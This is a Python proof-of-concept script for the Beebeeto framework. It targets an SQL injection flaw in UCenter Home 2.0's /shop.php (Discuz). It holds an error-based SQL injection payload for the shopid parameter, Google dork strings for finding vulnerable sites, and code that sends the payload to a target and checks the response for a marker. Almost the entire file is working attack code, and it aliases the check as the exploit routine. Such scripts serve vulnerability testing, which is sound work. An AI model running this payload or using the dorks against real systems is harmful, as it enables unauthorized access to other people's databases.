#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0069',
            'name': 'UCenter Home 2.0 /shop.php SQL注入漏洞 POC',
            'author': 'tmp',
            'create_date': '2015-03-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['2.0'],
            'type': 'SQL Injection',
            'tag': ['Discuz UCenter Home漏洞', '/shop.php漏洞', 'php'],
            'desc': '''
                    Script HomePage : http://u.discuz.net/
                    Dork : Powered by UCenter inurl:shop.php?ac=view
                    Dork 2 : inurl:shop.php?ac=view&shopid=
                    ''',
            'references': ['http://www.exploit-db.com/exploits/14997/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = ("/shop.php?ac=view&shopid=253 AND (SELECT 4650 FROM(SELECT COUNT(*),"
                   "CONCAT(0x716b6a6271,(SELECT (CASE WHEN (4650=4650) THEN 1 ELSE 0 END)),"
                   "0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
        verify_url = url + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = requests.get(verify_url).content
        if 'qkjbq1qxxpq1' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())